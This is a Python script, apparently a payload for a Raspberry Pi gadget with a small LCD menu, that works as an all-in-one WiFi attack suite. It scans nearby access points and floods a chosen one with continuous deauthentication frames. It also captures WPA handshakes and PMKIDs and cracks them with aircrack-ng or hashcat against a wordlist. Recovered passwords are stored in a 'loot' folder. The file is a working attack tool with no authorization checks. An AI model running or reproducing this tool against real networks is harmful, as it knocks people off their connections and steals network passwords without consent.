#!/usr/bin/env python3
"""
KTOx Payload – WiFi Attack Suite
=================================
All-in-one tool: scan, deauth, handshake capture, PMKID, and cracking.

Loot: /root/KTOx/loot/WiFiAttack/
Dependencies: aircrack-ng, hcxdumptool (optional), aircrack-ng, wordlist
"""

import os
import sys
import time
import json
import subprocess
import re
import threading
from datetime import datetime

sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
import monitor_mode_helper

# KTOx hardware
import RPi.GPIO as GPIO
import LCD_1in44
from PIL import Image, ImageDraw, ImageFont

# ----------------------------------------------------------------------
# Paths & config
# ----------------------------------------------------------------------
LOOT_DIR = "/root/KTOx/loot/WiFiAttack"
os.makedirs(LOOT_DIR, exist_ok=True)
LOG_FILE = os.path.join(LOOT_DIR, "attack_log.txt")

WORDLIST = "/usr/share/wordlists/rockyou.txt"
if not os.path.exists(WORDLIST):
    WORDLIST = "/usr/share/john/password.lst"

# ----------------------------------------------------------------------
# LCD & GPIO
# ----------------------------------------------------------------------
PINS = {
    "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26,
    "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16,
}
GPIO.setmode(GPIO.BCM)
for pin in PINS.values():
    GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
W, H = 128, 128

def font(size=9):
    try:
        return ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf", size)
    except:
        return ImageFont.load_default()
FONT = font(9)
FONT_BOLD = font(10)

def wait_btn(timeout=0.1):
    start = time.time()
    while time.time() - start < timeout:
        for name, pin in PINS.items():
            if GPIO.input(pin) == 0:
                time.sleep(0.05)
                return name
        time.sleep(0.02)
    return None

def draw_lines(lines, title="WiFi Attack Suite", highlight=-1):
    img = Image.new("RGB", (W, H), (10, 0, 0))
    d = ImageDraw.Draw(img)
    d.rectangle((0, 0, W, 13), fill=(139, 0, 0))
    d.text((4, 2), title[:20], font=FONT, fill=(231, 76, 60))
    y = 16
    for i, line in enumerate(lines[:7]):
        if i == highlight:
            d.rectangle((0, y-1, W, y+9), fill=(60, 0, 0))
            d.text((4, y), line[:23], font=FONT, fill=(255, 255, 255))
        else:
            d.text((4, y), line[:23], font=FONT, fill=(171, 178, 185))
        y += 12
    d.rectangle((0, H-12, W, H), fill=(34, 0, 0))
    d.text((4, H-10), "UP/DOWN OK  K1=Back K2=Scan K3=Exit", font=FONT, fill=(192, 57, 43))
    LCD.LCD_ShowImage(img, 0, 0)

def show_message(msg, sub=""):
    img = Image.new("RGB", (W, H), (10, 0, 0))
    d = ImageDraw.Draw(img)
    d.text((10, 50), msg, font=FONT_BOLD, fill=(30, 132, 73))
    if sub:
        d.text((4, 65), sub[:22], font=FONT, fill=(113, 125, 126))
    LCD.LCD_ShowImage(img, 0, 0)
    time.sleep(1.5)

# ----------------------------------------------------------------------
# Utilities
# ----------------------------------------------------------------------
def run_cmd(cmd, timeout=30):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return r.returncode, r.stdout + r.stderr
    except Exception as e:
        return -1, str(e)

def log_action(msg):
    with open(LOG_FILE, "a") as f:
        f.write(f"[{datetime.now().isoformat()}] {msg}\n")

# ----------------------------------------------------------------------
# Interface & monitor mode
# ----------------------------------------------------------------------
def get_wlan_iface():
    for iface in ["wlan1", "wlan0"]:
        if os.path.exists(f"/sys/class/net/{iface}"):
            return iface
    return None

def enable_monitor(iface):
    return monitor_mode_helper.activate_monitor_mode(iface)

def disable_monitor(iface):
    monitor_mode_helper.deactivate_monitor_mode(iface)

# ----------------------------------------------------------------------
# Scanning
# ----------------------------------------------------------------------
def scan_aps(mon_iface):
    tmp = "/tmp/wifi_scan"
    run_cmd(f"rm -f {tmp}*")
    run_cmd(f"timeout 10 airodump-ng --output-format csv -w {tmp} {mon_iface}")
    time.sleep(1)
    aps = []
    csv_file = f"{tmp}-01.csv"
    if os.path.exists(csv_file):
        with open(csv_file, errors="ignore") as f:
            content = f.read()
        if "Station MAC" in content:
            content = content.split("Station MAC")[0]
        lines = content.strip().split("\n")
        header_idx = -1
        for i, line in enumerate(lines):
            if "BSSID" in line and "ESSID" in line:
                header_idx = i
                break
        if header_idx >= 0:
            headers = [h.strip() for h in lines[header_idx].split(",")]
            try:
                col_bssid = headers.index("BSSID")
                col_ch = headers.index("channel")
                col_essid = headers.index("ESSID")
                col_enc = headers.index("Encryption")
            except:
                return []
            for line in lines[header_idx+1:]:
                if not line.strip():
                    continue
                parts = [p.strip() for p in line.split(",")]
                if len(parts) <= max(col_bssid, col_ch, col_essid):
                    continue
                bssid = parts[col_bssid]
                if not re.match(r"([0-9A-Fa-f]{2}:){5}", bssid):
                    continue
                essid = parts[col_essid]
                if essid and essid != "(not associated)":
                    ch = parts[col_ch]
                    enc = parts[col_enc] if len(parts) > col_enc else ""
                    aps.append({
                        "bssid": bssid,
                        "essid": essid,
                        "channel": ch,
                        "encryption": enc
                    })
    return aps

# ----------------------------------------------------------------------
# Deauth
# ----------------------------------------------------------------------
def deauth_ap(mon_iface, bssid, ch, essid):
    run_cmd(f"pkill -9 aireplay-ng")
    proc = subprocess.Popen(f"aireplay-ng --deauth 0 -a {bssid} {mon_iface}",
                            shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    show_message(f"DEAUTH ON\n{essid[:16]}\nPress KEY3 to stop")
    while True:
        btn = wait_btn(0.5)
        if btn == "KEY3":
            break
    proc.terminate()
    run_cmd("pkill -9 aireplay-ng")
    show_message("Deauth stopped")

# ----------------------------------------------------------------------
# Handshake capture
# ----------------------------------------------------------------------
def capture_handshake(mon_iface, bssid, ch, essid):
    safe = re.sub(r"[^a-zA-Z0-9_-]", "_", essid)[:20]
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    out = os.path.join(LOOT_DIR, f"hs_{safe}_{ts}")
    cap_file = f"{out}.cap"
    run_cmd(f"mkdir -p {out}")
    proc = subprocess.Popen(f"airodump-ng -c {ch} --bssid {bssid} -w {out} {mon_iface}",
                            shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(3)
    run_cmd(f"aireplay-ng --deauth 10 -a {bssid} {mon_iface}")
    show_message(f"Capturing handshake\n{essid[:16]}\nWait 20 sec...")
    time.sleep(20)
    proc.terminate()
    time.sleep(1)
    # verify
    if os.path.exists(f"{out}-01.cap"):
        os.rename(f"{out}-01.cap", cap_file)
        log_action(f"Handshake captured: {essid} ({bssid}) -> {cap_file}")
        return cap_file
    return None

# ----------------------------------------------------------------------
# PMKID capture (requires hcxdumptool)
# ----------------------------------------------------------------------
def capture_pmkid(mon_iface, bssid, ch, essid):
    safe = re.sub(r"[^a-zA-Z0-9_-]", "_", essid)[:20]
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    out = os.path.join(LOOT_DIR, f"pmkid_{safe}_{ts}.pcapng")
    cmd = f"hcxdumptool -i {mon_iface} -o {out} -c {ch} --filterlist={bssid} --filtermode=2 -t 30"
    show_message(f"PMKID capture\n{essid[:16]}\n30 sec...")
    run_cmd(cmd, timeout=35)
    hash_file = out.replace(".pcapng", ".16800")
    run_cmd(f"hcxpcaptool -z {hash_file} {out}")
    if os.path.exists(hash_file) and os.path.getsize(hash_file) > 0:
        log_action(f"PMKID captured: {essid} ({bssid}) -> {hash_file}")
        return hash_file
    return None

# ----------------------------------------------------------------------
# Cracking
# ----------------------------------------------------------------------
def crack_handshake(cap_file, essid):
    show_message(f"Cracking with {os.path.basename(WORDLIST)}...", "May take minutes")
    rc, out = run_cmd(f"aircrack-ng -w {WORDLIST} {cap_file} 2>/dev/null", timeout=300)
    m = re.search(r"KEY FOUND!\s*\[\s*(.+?)\s*\]", out)
    if m:
        password = m.group(1)
        log_action(f"CRACKED {essid}: {password}")
        # save cracked result
        cracked_file = cap_file.replace(".cap", "_cracked.txt")
        with open(cracked_file, "w") as f:
            f.write(f"ESSID: {essid}\nPassword: {password}\nFile: {cap_file}\nDate: {datetime.now()}\n")
        show_message(f"Password found!\n{password[:20]}")
        return password
    show_message("Not cracked", "Try better wordlist")
    return None

def crack_pmkid(hash_file, essid):
    show_message(f"Cracking PMKID...", "hashcat mode 16800")
    rc, out = run_cmd(f"hashcat -m 16800 {hash_file} {WORDLIST} --force --quiet", timeout=300)
    # parse hashcat output
    with open(hash_file, "r") as f:
        hashes = f.read().strip()
    for line in out.splitlines():
        if ":" in line and essid.lower() in line.lower():
            parts = line.strip().split(":")
            if len(parts) >= 2:
                password = parts[-1]
                log_action(f"CRACKED PMKID {essid}: {password}")
                cracked_file = hash_file.replace(".16800", "_cracked.txt")
                with open(cracked_file, "w") as f:
                    f.write(f"ESSID: {essid}\nPassword: {password}\nFile: {hash_file}\n")
                show_message(f"Password found!\n{password[:20]}")
                return password
    show_message("Not cracked", "Try better wordlist")
    return None

# ----------------------------------------------------------------------
# Main menu
# ----------------------------------------------------------------------
def main():
    iface = get_wlan_iface()
    if not iface:
        show_message("No WiFi interface")
        return
    show_message(f"Enabling monitor on {iface}...")
    mon = enable_monitor(iface)
    if not mon:
        show_message("Monitor mode failed")
        return
    show_message(f"Monitor: {mon}", "Scanning...")
    time.sleep(1)

    menu = ["1. Scan APs", "2. Deauth AP", "3. Capture Handshake", "4. Capture PMKID", "5. Crack Captured", "6. View Loot"]
    idx = 0
    aps = []
    selected_ap = None

    while True:
        draw_lines(menu, "WiFi Attack Suite", idx)
        btn = wait_btn(0.2)
        if btn == "UP":
            idx = (idx - 1) % len(menu)
        elif btn == "DOWN":
            idx = (idx + 1) % len(menu)
        elif btn == "OK":
            choice = menu[idx][0]
            if choice == "1":
                show_message("Scanning APs...", "10 sec")
                aps = scan_aps(mon)
                if not aps:
                    show_message("No APs found")
                    continue
                # Display AP list
                ap_list = [f"{ap['essid'][:16]}  ch{ap['channel']}" for ap in aps]
                sel_ap_idx = 0
                while True:
                    draw_lines(ap_list, "Select AP", sel_ap_idx)
                    btn2 = wait_btn(0.2)
                    if btn2 == "UP":
                        sel_ap_idx = (sel_ap_idx - 1) % len(ap_list)
                    elif btn2 == "DOWN":
                        sel_ap_idx = (sel_ap_idx + 1) % len(ap_list)
                    elif btn2 == "OK":
                        selected_ap = aps[sel_ap_idx]
                        show_message(f"Selected: {selected_ap['essid'][:16]}")
                        break
                    elif btn2 == "KEY1" or btn2 == "KEY3":
                        break
            elif choice == "2":
                if not selected_ap:
                    show_message("No AP selected", "Scan first")
                    continue
                deauth_ap(mon, selected_ap["bssid"], selected_ap["channel"], selected_ap["essid"])
            elif choice == "3":
                if not selected_ap:
                    show_message("No AP selected", "Scan first")
                    continue
                cap_file = capture_handshake(mon, selected_ap["bssid"], selected_ap["channel"], selected_ap["essid"])
                if cap_file:
                    show_message(f"Handshake saved", os.path.basename(cap_file))
                    # offer crack
                    draw_lines(["Crack now? OK=Yes K1=No"], "Crack?")
                    if wait_btn(2) == "OK":
                        crack_handshake(cap_file, selected_ap["essid"])
                else:
                    show_message("Handshake capture failed")
            elif choice == "4":
                if not selected_ap:
                    show_message("No AP selected", "Scan first")
                    continue
                # check if hcxdumptool exists
                rc, _ = run_cmd("which hcxdumptool")
                if rc != 0:
                    show_message("hcxdumptool not installed", "sudo apt install hcxdumptool")
                    continue
                hash_file = capture_pmkid(mon, selected_ap["bssid"], selected_ap["channel"], selected_ap["essid"])
                if hash_file:
                    show_message(f"PMKID saved", os.path.basename(hash_file))
                    draw_lines(["Crack now? OK=Yes K1=No"], "Crack?")
                    if wait_btn(2) == "OK":
                        crack_pmkid(hash_file, selected_ap["essid"])
                else:
                    show_message("PMKID capture failed")
            elif choice == "5":
                # list captured files
                caps = [f for f in os.listdir(LOOT_DIR) if f.endswith(".cap") or f.endswith(".16800")]
                if not caps:
                    show_message("No captured files")
                    continue
                cap_idx = 0
                while True:
                    draw_lines(caps, "Select file", cap_idx)
                    btn2 = wait_btn(0.2)
                    if btn2 == "UP":
                        cap_idx = (cap_idx - 1) % len(caps)
                    elif btn2 == "DOWN":
                        cap_idx = (cap_idx + 1) % len(caps)
                    elif btn2 == "OK":
                        fname = caps[cap_idx]
                        full = os.path.join(LOOT_DIR, fname)
                        if fname.endswith(".cap"):
                            essid = fname.split("_")[1] if "_" in fname else "unknown"
                            crack_handshake(full, essid)
                        elif fname.endswith(".16800"):
                            essid = fname.split("_")[1] if "_" in fname else "unknown"
                            crack_pmkid(full, essid)
                        break
                    elif btn2 == "KEY1" or btn2 == "KEY3":
                        break
            elif choice == "6":
                # view loot files
                files = sorted(os.listdir(LOOT_DIR), reverse=True)[:10]
                if not files:
                    show_message("No loot files")
                    continue
                file_idx = 0
                while True:
                    draw_lines(files, "Loot files", file_idx)
                    btn2 = wait_btn(0.2)
                    if btn2 == "UP":
                        file_idx = (file_idx - 1) % len(files)
                    elif btn2 == "DOWN":
                        file_idx = (file_idx + 1) % len(files)
                    elif btn2 == "OK":
                        fpath = os.path.join(LOOT_DIR, files[file_idx])
                        try:
                            with open(fpath, "r") as f:
                                content = f.read().splitlines()[:6]
                            draw_lines(content, files[file_idx][:20])
                            time.sleep(2)
                        except:
                            show_message("Cannot read file")
                    elif btn2 == "KEY1" or btn2 == "KEY3":
                        break
        elif btn == "KEY2":
            # quick scan
            show_message("Refreshing scan...")
            aps = scan_aps(mon)
            if aps:
                show_message(f"Found {len(aps)} APs")
            else:
                show_message("No APs")
        elif btn == "KEY3":
            break
        elif btn == "KEY1":
            # back in menus handled above
            pass

    disable_monitor(iface)
    GPIO.cleanup()
    LCD.LCD_Clear()

if __name__ == "__main__":
    main()
